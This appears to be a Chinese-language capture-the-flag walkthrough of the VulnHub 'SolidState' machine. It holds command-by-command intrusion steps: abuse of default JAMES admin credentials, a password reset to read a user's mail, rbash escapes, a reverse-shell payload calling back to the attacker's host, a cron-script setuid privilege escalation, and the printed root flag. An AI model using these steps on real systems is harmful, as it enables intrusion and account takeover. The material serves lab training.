## port scan

```shell
# Nmap 7.94SVN scan initiated Wed Jan 22 04:48:21 2025 as: nmap -sT --min-rate 10000 -p- -oN nmap_result/port 192.168.28.13
Nmap scan report for 192.168.28.13 (192.168.28.13)
Host is up (0.0025s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

```shell
# Nmap 7.94SVN scan initiated Wed Jan 22 04:49:08 2025 as: nmap -sT -sVC -O -p22,25,80,110,119,4555 -oN nmap_result/detils 192.168.28.13
Nmap scan report for 192.168.28.13 (192.168.28.13)
Host is up (0.00080s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello 192.168.28.13 (192.168.28.4 [192.168.28.4]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
MAC Address: 00:0C:29:2A:4B:40 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

110端口：**邮局协议 (POP)** 被描述为计算机网络和互联网领域中的一种协议，用于从远程邮件服务器中提取和**检索电子邮件**

4555端口：james远程管理工具

![image-20250122192430900](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250122192430900.png)

`50347.py`脚本中，默认账号密码`root:root`

## James Server

```shell
┌──(kali㉿kali)-[~/vulnhub/SolidState]
└─$ nc 192.168.28.13 4555  
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
setpassword mindy 123456
Password for mindy reset
```

用户有6个

```
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

将`mindy`密码设置为123456

```
setpassword mindy 123456
Password for mindy rese
```

## POP3

```shell
┌──(kali㉿kali)-[~/vulnhub/SolidState]
└─$ telnet 192.168.28.14 110
Trying 192.168.28.14...
Connected to 192.168.28.14.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS 123456
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

登录用户mindy，retr命令，查看邮件

```
username: mindy
pass: P@55W0rd1!2@
```

绕过rbash限制

https://xz.aliyun.com/t/7642

ssh登录时逃逸 （借助-t远程在远程机器上运行脚本）

```
ssh mindy@192.168.28.14 "python -c 'import os; os.system(\"/bin/bash\")'"
```

或

```
ssh mindy@192.168.28.14 -t "bash --noprofile"
```

也可以通过`50347.py`（james-admin）的RCE漏洞，绕过rbash

```shell
┌──(kali㉿kali)-[~/vulnhub/SolidState]
└─$ python3 50347.py 192.168.28.14 192.168.28.4 1234
[+]Payload Selected (see script for more options):  /bin/bash -i >& /dev/tcp/192.168.28.4/1234 0>&1
[+]Example netcat listener syntax to use after successful execution: nc -lvnp 1234
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 1234 before logging in!
```

登录ssh，触发payload

![image-20250123130015559](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250123130015559.png)

## 提权

查找可写文件

```
find / -writable 2>/dev/null 
```

/opt/tmp.py

```shell
mindy@solidstate:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  147 Jan 22 05:48 tmp.py
```

猜测是定时任务，插入python代码

```shell
mindy@solidstate:/opt$ cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ;cp /bin/bash /tmp/bash;chmod +s /tmp/bash')
except:
     sys.exit()
```

```shell
mindy@solidstate:/tmp$ ./bash -p
bash-4.4# id
uid=1001(mindy) gid=1001(mindy) euid=0(root) egid=0(root) groups=0(root),1001(mindy)
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
b4c9723a28899b1c45db281d99cc87c9
```

`/var/spool/cron/crontabs/root`果然存在定时任务

```shell
bash-4.4# cat /var/spool/cron/crontabs/root
......
*/3 * * * * python /opt/tmp.py
```

